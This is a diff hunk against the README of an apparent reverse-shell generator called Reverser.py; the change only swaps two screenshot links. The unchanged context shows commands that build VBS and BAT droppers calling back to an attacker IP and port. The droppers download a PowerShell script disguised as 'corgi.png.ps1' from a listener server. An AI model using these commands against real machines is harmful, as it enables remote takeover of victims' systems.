@@ -51,13 +51,14 @@ Creating a VBS file with the tool and transferring it to the listener's director
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type vbs -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
 ```
-![image](https://github.com/user-attachments/assets/ad71135d-a456-427c-a0e5-89bc95d0d4cf)
+![image](https://github.com/user-attachments/assets/4fc96af2-76e4-4143-a598-a112b934526e)
 
 Creating a BAT file with the tool and transferring it to the listener's directory:
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
 ```
-![image](https://github.com/user-attachments/assets/91411dd0-7ef9-42d2-95c8-918fb3ba42c2)
+![image](https://github.com/user-attachments/assets/8213c8fc-da3b-4588-90b8-7382d599caca)
+
 
 
 -----------------------------
